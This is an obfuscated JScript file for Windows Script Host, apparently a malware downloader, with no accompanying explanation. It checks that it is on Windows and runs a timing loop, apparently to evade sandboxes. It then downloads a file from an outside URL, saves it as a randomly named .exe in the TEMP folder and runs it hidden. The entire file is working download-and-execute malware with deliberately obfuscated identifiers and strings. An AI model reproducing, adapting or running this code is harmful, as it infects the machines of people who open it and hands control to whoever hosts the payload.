var _ST = false;
var _C0 = "CreateObject";
var _J = function _NZ() {return WScript[_C0]("WScript"+".Shell");}(), _WG = 11;
var _O0 = "MSXML2.XMLHTTP";
var _T0 = 2123213;
var _WU = 0;
function _HS(_GQ){_J["Run"](_GQ, _WU, _WU);};
function _JL(){return _O0 + "";};
function _PD(_Q, _D){_WU = _WU * 1; return _Q - _D;};
function _Y(){return _C0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _ST = true;
  @end
@*/
if (_ST)
{
var _BN = "";
function _FD(){return 22;};
var _FR = 0; var _AE = 0;
function _R()
{
var _C1 = new this["Date"]();
var _IR = _C1["getUTCMilliseconds"]();
WScript["Sleep"](_FD());
var _C1 = new this["Date"]();
var _QX = _C1["getUTCMilliseconds"]();
WScript["Sleep"](_FD());
var _C1 = new this["Date"]();
var _F = _C1["getUTCMilliseconds"]();
var _FR = "_T";
_FR = _PD(_QX, _IR);
var _AE = "_X";
_AE = _PD(_F, _QX);
_BN = "open";
return _PD(_FR, _AE);
}
var _Y0 = false;
var _VO = false;
for (var _E = _WU; _E < _FD() * 1; _E++){if (_R() != _WU){
_Y0 = true; 
_AE = "31" + 11 * _FR + _AE; 
_VO = true; 
break;
}}
function _O() {return ((_Y0 == true) && (_Y0 == _VO)) ? 1 : _WU;};
if (_Y0 && _O() && _VO){
function _KB() {return _J["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "cLwVbH9GgJ.ex" + "e";};
 _L = _JL();
 _J0 = WScript[_C0](_L);
 var _KV = 1;
 while (_KV){
try {
	if (_KV == 1)
	{
		_J0[_BN]("GET", "http://hollandfoodexchange.com/d7jsa", false);
		_J0["send"]();
		_WC = "Sleep";
	}
	WScript[_WC](_FD() + 120); 
	if (_J0["readystate"] < 2 * 2) continue;
	_KV = _WU;
	function _P(_C) {var _S = (1, 2, 3, 4, 5, _C); return _S;};
	_HV = WScript[_Y()]("ADODB.Stream");
	_L = _HV;
	_L[_BN]();
	_L["type"] = _P(1);
	_L["write"](_J0["ResponseBody"]);
	_HV["position"] = _P(_WU);
	_L["Save" + "ToFile"](_KB(), 2);
	_HV["cl"+"ose"]();
	_W = _KB();
	_HS(_W);
} catch(_N){};
}
}
}

